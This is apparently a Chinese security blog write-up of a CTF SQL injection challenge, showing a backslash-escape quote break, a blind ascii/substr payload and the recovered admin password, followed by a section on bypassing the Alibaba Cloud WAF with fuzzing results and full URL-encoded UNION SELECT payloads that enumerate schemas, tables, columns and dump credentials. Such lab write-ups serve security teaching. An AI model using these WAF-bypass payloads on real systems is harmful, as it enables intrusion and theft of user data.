## **前言**

今天，我们通过一道赛题来与大家分享sql注入的绕过技巧。大家在攻防中经常会遇到各种厂商开源或者商用的waf产品，那么“如何进行合理的绕过”其实是红队攻击人员必备的素养。![](https://image.3001.net/images/20230719/1689737032_64b7574857254231904fe.png!small)

 **01** 尝试初步注入，发现很多字符已被过滤。在burp进行
fuzz，暴力破解模块跑sql注入的关键字字典，我们发现基本注入的可能性为0。因为该过滤的字符都已被过滤完毕，没有过滤的按空格substr ascii ^。
![](https://image.3001.net/images/20230719/1689737060_64b757644869cccbe6db9.png!small)

  

**02** 扫描发现，robots.txt得到提示——hint.txt，访问 hint.txt。

select * from users where username='$_POST["username"]' and
password='$_POST["password"]';

此处知识点——\是转义符，可以对’”\进行转义，使其失去本来的特殊意义；同时，这里的\是没有被过滤。

 **03** 如果传入 username=admin\ password=123456#，就会变成：

select * from users where username='admin\' and password='123456#';

可以理解为：

select * from users where username='admin and password=' 恶意代码 #';

post username=admin\ password=^(ascii(substr(password,1,1))>1000)#

 **04** 开始进行构造初步payload。

![](https://image.3001.net/images/20230719/1689737114_64b7579a0d47eb26113c2.png!small)

当 2>4 时，显示 girl friend；

当 2>1 时，显示 BJD needs to be stronger。

  

此时已经闭合成功。接下来就是直接查询密码即可，因为当前页面就是所调用的用户表，所以直接查询即可。

![](https://image.3001.net/images/20230719/1689737137_64b757b173f998a2c4128.png!small)

 **05** 当盲注 payload 里的ascii值>200时，页面回显如下。

![](https://image.3001.net/images/20230719/1689737157_64b757c517cb83057938f.png!small)

 **06** 书写脚本即可。

![](https://image.3001.net/images/20230719/1689737169_64b757d1f08accebdea86.png!small)

 **07** 最终爆出密码为OhyOuFOuNdit，账号为admin。

登录即可获取flag。

 **彩蛋：绕过阿里云fuzz过程分享**

 **当输入and
1=1拦截，waf处于生效状态。**![](https://image.3001.net/images/20230719/1689737195_64b757eb133da4469cbb4.png!small)

1\. 首先进行逻辑符与部分sql注入关键字判断。

and 1=1 拦截

and -1=-1 拦截

and 不拦截

xor 1 异常

xor 0 正常

%26 1=2 异常

%26 1=1 正常

%26 hex(1) 正常

%26 hex(0) 异常

and hex() 不拦截

order by 不拦截

order by 1 拦截

group by 1 不拦截

2\. 完整SQL注入的攻击语法如下，可以使用%0A%20—进行绕过，并添加一些关键词。

 **sql攻击语法：**

 **#获取所有数据库名称**

[http://cz.aliyun.lvluoyun.com:8080/Tkitn/sqli-labs-master/Less-1/index.php?id=-1%27%20UNION%0A%20-%20%20%20%20%99%20%0A%0A%0ASELECT%201,2,concat%23%0a(schema_name)%20from%20%20/*like%22%0d%0a%20%2d%2d%20%0d%22*/%20%0d%0a%20INFORMATION_SCHEMA%0d%0a.schemata%20limit%204,1--+](http://cz.aliyun.lvluoyun.com:8080/Tkitn/sqli-labs-master/Less-1/index.php?id=-1%27%20UNION%0A%20-%20%20%20%20%99%20%0A%0A%0ASELECT%201,2,concat%23%0A\(schema_name\)%20from%20%20/*like%22%0D%0A%20--%20%0D%22*/%20%0D%0A%20INFORMATION_SCHEMA%0D%0A.schemata%20limit%204,1--+)![](https://image.3001.net/images/20230719/1689737208_64b757f8be3c895c54f77.png!small)

 **#获取当前数据库表名称**

Less-1/?id=-1%27%20UNION%0A%20--%20%20%20%20%99%20%0A%0A%0ASELECT%201,2,concat(table_name)%20from%20%20/*like%22%0d%0a%20%2d%2d%20%0d%22*/%20%0d%0a%20INFORMATION_SCHEMA%0d%0a.tables%20where%20table_schema=database()%20limit%201,1--+

 **#获取users表所有字段**

?id=-1%27%20UNION%0A%20--%20%20%20%20%99%20%0A%0A%0ASELECT%201,2,concat(column_name)%20from%20%20/*like%22%0d%0a%20%2d%2d%20%0d%22*/%20%0d%0a%20INFORMATION_SCHEMA%0d%0a.columns%20where%20table_name='users'%20limit%200,1--+

 **#获取数据**

?id=-1%27%20UNION%0A%20--%20%20%20%20%99%20%0A%0A%0ASELECT%201,2,concat(username,0x7e,password)%20from%20users%20limit%202,1--+

 **#通用用例列表：**

![](https://image.3001.net/images/20230719/1689737221_64b7580534812c95aa320.png!small)

  

